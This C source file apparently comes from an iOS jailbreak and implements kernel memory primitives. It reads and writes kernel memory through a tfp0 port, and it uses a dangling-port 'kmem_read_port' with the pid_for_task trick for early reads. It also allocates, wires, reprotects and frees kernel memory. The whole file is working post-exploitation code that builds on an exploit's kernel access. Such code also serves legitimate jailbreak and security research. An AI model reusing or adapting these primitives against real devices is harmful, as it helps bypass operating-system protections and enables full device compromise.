#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "KernelMemory.h"
#include "KernelUtilities.h"
#include <common.h>

size_t kreads = 0;
size_t kwrites = 0;

// the exploit bootstraps the full kernel memory read/write with a fake
// task which just allows reading via the bsd_info->pid trick
// this first port is kmem_read_port
mach_port_t kmem_read_port = MACH_PORT_NULL;
void prepare_rk_via_kmem_read_port(mach_port_t port)
{
    kmem_read_port = port;
}

mach_port_t tfp0 = MACH_PORT_NULL;
void prepare_rwk_via_tfp0(mach_port_t port)
{
    tfp0 = port;
}

void prepare_for_rw_with_fake_tfp0(mach_port_t fake_tfp0)
{
    tfp0 = fake_tfp0;
}

bool have_kmem_read()
{
    return MACH_PORT_VALID(kmem_read_port) || MACH_PORT_VALID(tfp0);
}

bool have_kmem_write()
{
    return MACH_PORT_VALID(tfp0);
}

size_t kread(kptr_t where, void* p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(tfp0,
            where + offset,
            chunk,
            (mach_vm_address_t)p + offset,
            &sz);
        if (rv || sz == 0) {
            LOG("error reading kernel @%p", (void*)(offset + where));
            break;
        }
        offset += sz;
    }
    kreads += offset;
    return offset;
}

size_t kwrite(kptr_t where, const void* p, size_t size)
{
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(tfp0,
            where + offset,
            (mach_vm_offset_t)p + offset,
            (mach_msg_type_number_t)chunk);
        if (rv) {
            LOG("error writing kernel @%p", (void*)(offset + where));
            break;
        }
        offset += chunk;
    }
    kwrites += offset;
    return offset;
}

bool wkbuffer(kptr_t kaddr, void* buffer, size_t length)
{
    if (!MACH_PORT_VALID(tfp0)) {
        LOG("attempt to write to kernel memory before any kernel memory write primitives available");
        return false;
    }
    
    return (kwrite(kaddr, buffer, length) == length);
}

bool rkbuffer(kptr_t kaddr, void* buffer, size_t length)
{
    if (!MACH_PORT_VALID(tfp0)) {
        LOG("attempt to read kernel memory but no kernel memory read primitives available");
        return 0;
    }
    
    return (kread(kaddr, buffer, length) == length);
}

bool WriteKernel32(kptr_t kaddr, uint32_t val)
{
    return wkbuffer(kaddr, &val, sizeof(val));
}

bool WriteKernel64(kptr_t kaddr, uint64_t val)
{
    return wkbuffer(kaddr, &val, sizeof(val));
}

uint32_t rk32_via_kmem_read_port(kptr_t kaddr)
{
    kern_return_t err;
    if (kmem_read_port == MACH_PORT_NULL) {
        LOG("kmem_read_port not set, have you called prepare_rk?");
        exit(EXIT_FAILURE);
    }

    mach_port_context_t context = (mach_port_context_t)kaddr - 0x10;
    err = mach_port_set_context(mach_task_self(), kmem_read_port, context);
    if (err != KERN_SUCCESS) {
        LOG("error setting context off of dangling port: %x %s", err, mach_error_string(err));
        exit(EXIT_FAILURE);
    }

    // now do the read:
    uint32_t val = 0;
    err = pid_for_task(kmem_read_port, (int*)&val);
    if (err != KERN_SUCCESS) {
        LOG("error calling pid_for_task %x %s", err, mach_error_string(err));
        exit(EXIT_FAILURE);
    }

    return val;
}

uint32_t rk32_via_tfp0(kptr_t kaddr)
{
    uint32_t val = 0;
    rkbuffer(kaddr, &val, sizeof(val));
    return val;
}

uint64_t rk64_via_kmem_read_port(kptr_t kaddr)
{
    uint64_t lower = rk32_via_kmem_read_port(kaddr);
    uint64_t higher = rk32_via_kmem_read_port(kaddr + 4);
    uint64_t full = ((higher << 32) | lower);
    return full;
}

uint64_t rk64_via_tfp0(kptr_t kaddr)
{
    uint64_t val = 0;
    rkbuffer(kaddr, &val, sizeof(val));
    return val;
}

uint32_t ReadKernel32(kptr_t kaddr)
{
    if (MACH_PORT_VALID(tfp0)) {
        return rk32_via_tfp0(kaddr);
    } else if (MACH_PORT_VALID(kmem_read_port)) {
        return rk32_via_kmem_read_port(kaddr);
    } else {
        LOG("attempt to read kernel memory but no kernel memory read primitives available");
        return 0;
    }
}

uint64_t ReadKernel64(kptr_t kaddr)
{
    if (MACH_PORT_VALID(tfp0)) {
        return rk64_via_tfp0(kaddr);
    } else if (MACH_PORT_VALID(kmem_read_port)) {
        return rk64_via_kmem_read_port(kaddr);
    } else {
        LOG("attempt to read kernel memory but no kernel memory read primitives available");
        return 0;
    }
}

void kmemcpy(uint64_t dest, uint64_t src, uint32_t length)
{
    if (KERN_POINTER_VALID(dest)) {
        // copy to kernel
        wkbuffer(dest, (void*)src, length);
    } else {
        // copy from kernel
        rkbuffer(src, (void*)dest, length);
    }
}

kptr_t kmem_alloc(uint64_t size)
{
    if (!MACH_PORT_VALID(tfp0)) {
        LOG("attempt to allocate kernel memory before any kernel memory write primitives available");
        return 0;
    }

    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);
    err = mach_vm_allocate(tfp0, &addr, ksize, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {
        LOG("unable to allocate kernel memory via tfp0: %s %x", mach_error_string(err), err);
        return 0;
    }
    
    return addr;
}

kptr_t kmem_alloc_wired(uint64_t size)
{
    if (!MACH_PORT_VALID(tfp0)) {
        LOG("attempt to allocate kernel memory before any kernel memory write primitives available");
        return 0;
    }

    kern_return_t err;
    mach_vm_address_t addr = 0;
    mach_vm_size_t ksize = round_page_kernel(size);

    err = mach_vm_allocate(tfp0, &addr, ksize + 0x4000, VM_FLAGS_ANYWHERE);
    if (err != KERN_SUCCESS) {
        LOG("unable to allocate kernel memory via tfp0: %s %x", mach_error_string(err), err);
        return 0;
    }

    addr += 0x3fff;
    addr &= ~0x3fffull;

    host_t host = mach_host_self();
    err = mach_vm_wire(host, tfp0, addr, ksize, VM_PROT_READ | VM_PROT_WRITE);
    mach_port_deallocate(mach_task_self(), host);
    host = HOST_NULL;
    if (err != KERN_SUCCESS) {
        LOG("unable to wire kernel memory via tfp0: %s %x", mach_error_string(err), err);
        return 0;
    }
    
    return addr;
}

bool kmem_free(kptr_t kaddr, uint64_t size)
{
    if (!MACH_PORT_VALID(tfp0)) {
        LOG("attempt to deallocate kernel memory before any kernel memory write primitives available");
        return false;
    }
    
    kern_return_t err;
    mach_vm_size_t ksize = round_page_kernel(size);
    err = mach_vm_deallocate(tfp0, kaddr, ksize);
    if (err != KERN_SUCCESS) {
        LOG("unable to deallocate kernel memory via tfp0: %s %x", mach_error_string(err), err);
        return false;
    }
    
    return true;
}

bool kmem_protect(kptr_t kaddr, uint32_t size, vm_prot_t prot)
{
    if (!MACH_PORT_VALID(tfp0)) {
        LOG("attempt to change protection of kernel memory before any kernel memory write primitives available");
        return false;
    }
    
    kern_return_t err;
    err = mach_vm_protect(tfp0, (mach_vm_address_t)kaddr, (mach_vm_size_t)size, 0, (vm_prot_t)prot);
    if (err != KERN_SUCCESS) {
        LOG("unable to change protection of kernel memory via tfp0: %s %x", mach_error_string(err), err);
        return false;
    }
    
    return true;
}
